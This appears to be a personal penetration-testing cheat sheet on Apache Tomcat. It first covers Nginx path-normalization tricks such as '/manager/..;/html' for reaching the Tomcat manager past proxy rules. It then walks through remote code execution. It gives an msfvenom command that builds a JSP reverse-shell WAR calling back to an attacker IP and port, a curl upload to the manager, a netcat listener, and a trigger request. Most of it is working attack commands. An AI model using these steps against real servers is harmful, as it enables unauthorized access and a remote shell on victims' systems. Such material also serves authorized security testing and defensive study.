---
Primary_category: "[[WEB TECHNOLOGIES]]"
title: TOMCAT
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
  - pentesting👹
  - Tomcat
  - WAR
  - Nginx
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB TECHNOLOGIES]]

***Apache Tomcat → Web Server and Servlets Container which allows to run Java Web Applications***

---

#### Nginx Path Normalization

> ***[Reference I](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;[Reference II](https://rioasmara.com/2022/03/21/nginx-and-tomcat-mutual-auth-bypass/)&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;[Reference III](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)***

An attacker if often faced with *Web Infrastructures* made up of *Nginx* as a *Reverse Proxy* and a *Backend Web Server (Upstream Server)* such as *Apache* or *Tomcat*

The way in which *URLs* are interpreted and normalised by both parties may change depending on the *Web Server*

This happens in some scenarios such as →

![[TOMCAT-20250415160851686.webp|450]]

As mentioned, *Nginx* parses and normalises the *URLs* in a different way than *Tomcat* does

This allows to bypass certain *location blocks* defined in the *Nginx Virtual Host Configuration File*, using a special crafted *URL* like →

![[TOMCAT-20250415161439838.webp|400]]

```bash
http[s]://domain.tld/manager;param=value/html
```

```bash
http[s]://domain.tld/manager/..;/html
http[s]://domain.tld/test/..;/manager/html
```

---

#### Remote Code Execution

##### *WAR Deployment*

###### *Payload Creation with MSFVenom*

```bash
msfvenom --payload java/jsp_shell_reverse_tcp LHOST=10.10.16.37 LPORT=443 --platform linux --arch x64 --format war --out rev.war
```

###### *Upload the .WAR File from Tomcat Manager*

> ***Tomcat Manager Path →* `http[s]://domain.tld/manager/html`**

Note that *War deploying* is allowed only if the logged user has one of the following roles →

***Admin&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;Manager&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;Manager-Script***

- ***Web Interface using any Browser***

![[TOMCAT-20250415154012649.webp|450]]

After upload the *.WAR File*, a new *Tomcat* application called `/rev` should have been created

![[TOMCAT-20250415154100920.webp|450]]

- ***Curl command***

```bash
curl --silent --request GET --location --user '<USER>:<PASSWORD>' --upload-file ./rev.war 'http[s]://domain.tld/manager/text'
```

###### *Get the Reverse Shell*

- ***From the Attacker*** ⚔️

```bash
nc -nlvp 443
```

```bash
curl --silent --location --request GET 'http[s]://domain.tld/rev/'
```

And we received the shell 😊